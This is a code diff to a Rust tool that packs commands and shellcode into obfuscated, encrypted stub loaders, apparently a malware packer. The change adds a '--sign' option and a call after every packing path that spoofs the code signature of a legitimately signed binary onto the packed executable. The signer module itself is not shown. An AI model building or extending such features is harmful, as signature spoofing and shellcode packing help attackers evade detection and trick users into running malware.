@@ -7,6 +7,7 @@ use std::process::Command;
 mod encryption;
 mod generator;
 mod obfuscation;
+mod signer;
 
 const ASCII_ART: &str = r#"
    _____ _                       ____  _                 
@@ -53,8 +54,11 @@ struct Args {
         help = "Use Rust stub loader instead of C templates"
     )]
     use_stub: bool,
+    #[arg(long, help = "Path to a signed binary to spoof signature from")]
+    sign: Option<PathBuf>,
 }
 
+// Force rebuild
 fn main() {
     let args = Args::parse();
     println!("{}", ASCII_ART);
@@ -68,6 +72,7 @@ fn main() {
             match packer::pack_cmd(cmd, &out_path, &args.obf) {
                 Ok(()) => {
                     println!("Packed using Rust stub: {}", out_path.display());
+                    try_spoof_signature(&out_path, &args.sign);
                 }
                 Err(e) => {
                     eprintln!("Failed to pack with Rust stub: {}", e);
@@ -103,6 +108,7 @@ fn main() {
                     match packer::pack_shellcode(input_path, &out_path, "local", None, &args.obf) {
                         Ok(()) => {
                             println!("Packed shellcode using Rust stub: {}", out_path.display());
+                            try_spoof_signature(&out_path, &args.sign);
                         }
                         Err(e) => {
                             eprintln!("Failed to pack shellcode with Rust stub: {}", e);
@@ -196,6 +202,23 @@ fn main() {
 
     if let Err(e) = compile_loader(&loader_source, &args) {
         eprintln!("Failed to compile loader: {}", e);
+    } else {
+        let out_path = PathBuf::from(format!("{}.exe", args.output));
+        try_spoof_signature(&out_path, &args.sign);
+    }
+}
+
+fn try_spoof_signature(target: &PathBuf, source: &Option<PathBuf>) {
+    if let Some(s) = source {
+        println!(
+            "Spoofing signature from {} to {}...",
+            s.display(),
+            target.display()
+        );
+        match signer::spoof_signature(target, s) {
+            Ok(_) => println!("Signature spoofed successfully."),
+            Err(e) => eprintln!("Failed to spoof signature: {}", e),
+        }
     }
 }
 
